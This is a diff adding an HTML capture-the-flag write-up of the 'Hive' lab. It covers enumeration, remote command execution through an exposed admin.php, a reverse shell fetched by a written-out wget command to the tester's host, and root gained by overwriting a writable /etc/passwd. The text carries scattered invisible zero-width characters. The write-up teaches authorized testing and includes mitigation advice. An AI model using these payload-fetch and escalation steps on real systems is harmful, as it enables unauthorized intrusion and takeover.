@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Hive Lab — RCE via admin.php</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Hive Lab — RCE via admin.php</h1>
+</header>
+<h3
+id="proof-of-concept-remote-command-execution-via-adminphp">Proof-of-Concept:
+Remote Command Execution Via admin.php.</h3>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li><p>Enumerate target services</p></li>
+<li><p>Discover the web admin interface</p></li>
+<li><p>Prove remote command execution (RCE) by delivering a controlled
+payload and obtaining an interactive shell</p></li>
+<li><p>Elevating privileges</p></li>
+</ul>
+<h2 id="background">Background</h2>
+<p>Web applications typically expose endpoints for administrative
+access, which may allow an attacker to execute arbitrary commands on the
+host if they are not securely implemented. In this lab, I will treat the
+target as a purposely vulnerable, authorized testing instance (i.e., CTF
+/ vulnerability VM) for the purposes of practicing practical offensive
+and defensive skills. Armed with permission, I will practice
+reconnaissance, exploitation, post-exploitation enumeration, and
+containment / mitigation advice. My task is not to damage any production
+systems at all. This is strictly limited to a lab network where I have
+explicit permission.</p>
+<h2 id="tools-used">Tools Used</h2>
+<ul>
+<li>Nmap</li>
+<li>Gobuster</li>
+<li>Ffuf</li>
+<li>NC (netcat)</li>
+<li>Reverse shell</li>
+<li>Python pty spawn</li>
+<li>Linpeas</li>
+</ul>
+<h2 id="methodology">Methodology</h2>
+<p>Starting, I run an Nmap scan to determine initial attack vectors.
+Thus, opened ports running vulnerable services, and you can bet, I found
+some just as seen in the image below.</p>
+<p><img src="media/Hive/image1.png" /></p>
+<p>I then accessed the web service running on Port 80.</p>
+<p><img src="media/Hive/image2.png" /></p>
+<p>I ran gobuster against the web root using a medium directory wordlist
+to find hidden directories or files (admin pages, config files) that are
+not linked from the site. The scan began and progressed; I kept the
+process running to pick up any hits.</p>
+<p><img src="media/Hive/image3.png" /></p>
+<p>I let the directory enumeration run and monitored for non-404 status
+codes and any discovered paths. I saw some timeouts and lots of 404s.
+Large wordlists will result in timeouts, but can still reveal valuable
+pages. I let the scan run to get maximum coverage. The fuzzing indicated
+sporadic positive responses; I kept investigating the discovered
+paths.</p>
+<p><img src="media/Hive/image4.png" /></p>
+<p>I​‍​‌‍​‍‌​‍​‌‍​‍‌ went to the directory that was found and saw an index revealing a
+file admin.php. An open admin page is a very attractive target, as it
+usually has control features that can be exploited. The index verified
+that admin.php is there and can be reached at that ‍​‌‍​‍‌​‍​‌‍​‍‌location.</p>
+<p><img src="media/Hive/image5.png" /></p>
+<p>To​‍​‌‍​‍‌​‍​‌‍​‍‌ see the behavior of the admin page, I tried to access it with the
+browser using the URL <strong><a
+href="http://192.168.56.109/restricted_access/admin.php">http://192.168.56.109/restricted_access/admin.php</a>.</strong>
+The response that I got was 403 Forbidden. Therefore, the page is there
+but it is likely to be protected by some sort of authorization, or it
+might need some ​‍​‌‍​‍‌​‍​‌‍​‍‌parameters.</p>
+<p><img src="media/Hive/image6.png" /></p>
+<p>I utilized the ffuf tool to perform brute force testing on the query
+parameters of admin.php to discover any additional functionality that
+the admin may have hidden. When the original path can't be accessed for
+some reason, brute forcing query parameters will often lead you to
+usable endpoints, like a ?cmd= endpoint or similar. ffuf generated
+several non-403 response codes from admin.php and began to show the
+candidate parameter names or outputs. This eventually led me to the
+admin UI, which accepts command input.</p>
+<p><img src="media/Hive/image7.png" /></p>
+<p>I​‍​‌‍​‍‌​‍​‌‍​‍‌ went over to the interface that was found and saw an input named
+Execute Command with a Run Command button. If the server page is
+executing the commands from the form that is essentially the RCE vector;
+so, I had to verify that it actually runs the OS commands on the
+server-side. The user interface seemed to allow commands (this is the
+main ‍​‌‍​‍‌​‍​‌‍​‍‌vulnerability)</p>
+<p><img src="media/Hive/image8.png" /></p>
+<p>On my Kali machine, I generated a reverse shell code from revshells
+and started a simple HTTP server to host payloads and prepared netcat to
+listen for a reverse shell.</p>
+<p><img src="media/Hive/image9.png" /></p>
+<p>Using​‍​‌‍​‍‌​‍​‌‍​‍‌ the admin UI, I sent a command:
+<code>wget http://192.168.56.108:9001/reverse</code> to get my staged
+payload. By bringing the payload to the target, it is possible to run a
+file that will establish a connection with my ​‍​‌‍​‍‌​‍​‌‍​‍‌listener.</p>
+<p><img src="media/Hive/image10.png" /></p>
+<p>The UI confirmed the command and indicated the requested
+filename.</p>
+<p><img src="media/Hive/image11.png" /></p>
+<p>I​‍​‌‍​‍‌​‍​‌‍​‍‌ kept an eye on my nc listener; it showed that a connection was made
+by the target. That means they have established an interactive channel
+from the target to the ‍​‌‍​‍‌​‍​‌‍​‍‌attacker.</p>
+<p><img src="media/Hive/image12.png" /></p>
+<p>I previously had only a shell without full tty capabilities, so I
+wrote a short Python script to upgrade it to a proper tty. Reverse
+shells can be problematic, and there are many useful features of a
+proper tty, such as job control and command editing etc. You can spawn a
+pty that turns it into a usable shell. I was able to work with an
+interactive shell with stability.</p>
+<p><img src="media/Hive/image13.png" /></p>
+<p>I listed /home, found the nana user, and read the user.proof file. To
+prove user-level access in the lab, it is important to find the
+<strong>user.proof</strong>. I documented the
+<strong>user.proof</strong> value as evidence of compromise.</p>
+<p><img src="media/Hive/image14.png" /> <img
+src="media/Hive/image15.png" /></p>
+<p>At this time, my main goal changed. I needed to obtain root
+privileges so that I could extract the root proof and finally complete
+the lab challenge. Because checking manually is slow and prone to
+mistakes, I decided to use linpeas.sh for a fast and thorough local
+enumeration. Linpeas is built to check for common privilege escalation
+routes (SUID binaries, bad scripts, cron jobs, bad file permissions,
+credential files and services that are misconfigured), so it was the
+quickest method of looking for reliable escalation avenues without just
+guessing.</p>
+<p><img src="media/Hive/image16.png" /> <img
+src="media/Hive/image17.png" /></p>
+<p>I​‍​‌‍​‍‌​‍​‌‍​‍‌ ran linpeas.sh and looked through its results in detail to figure
+out the most likely ways to escalate the privileges. Linpeas brought up
+a variety of interesting clues (for instance, insecure writable files, a
+service running under a higher-privileged user, or a credential saved in
+the web directory). Since /etc/passwd was writable, the only thing I had
+to do was copy the file and write to ​‍​‌‍​‍‌​‍​‌‍​‍‌it.</p>
+<p><img src="media/Hive/image18.png" /></p>
+<p>After accessing the /etc/passwd file, I realized it was encrypted in
+Bcrypt. I used an online Bcrypt Generator to replace the X value in the
+root passed to a hash of my own.</p>
+<p><img src="media/Hive/image19.png" /></p>
+<p>I successfully edited the /etc/passwd file and downloaded it back
+onto the vulnerable machine.</p>
+<p><img src="media/Hive/image20.png" /></p>
+<p>I cat the file out to confirm I have the right file.</p>
+<p><img src="media/Hive/image21.png" /></p>
+<p>After confirming the file, I switched to the root account and
+validated root access by listing root-only files and reading the
+<strong>root.proof</strong></p>
+<p><img src="media/Hive/image22.png" /></p>
+<h2 id="reflection">Reflection</h2>
+<p>I​‍​‌‍​‍‌​‍​‌‍​‍‌ deliberately narrowed down my confirmation of a foothold to a
+focused vertical escalation plan and, after that, I used Linpeas to
+guide me, so I limited the unnecessary noise and quickly found a
+reliable escalation path. Linpeas was not a solution that made
+everything instantly; I still checked the escalation manually and
+carried it out, but it was very helpful in cutting down the time to find
+the most valuable leads. As a corrective measure, I suggest that the
+server-side command execution UI be removed, strict auth on admin
+endpoints be enforced, directory listing be disabled, egress from web
+hosts be restricted, and file-permission or sudo misconfiguration, if
+any, should be corrected by ​‍​‌‍​‍‌​‍​‌‍​‍‌Linpeas.</p>
+</body>
+</html>
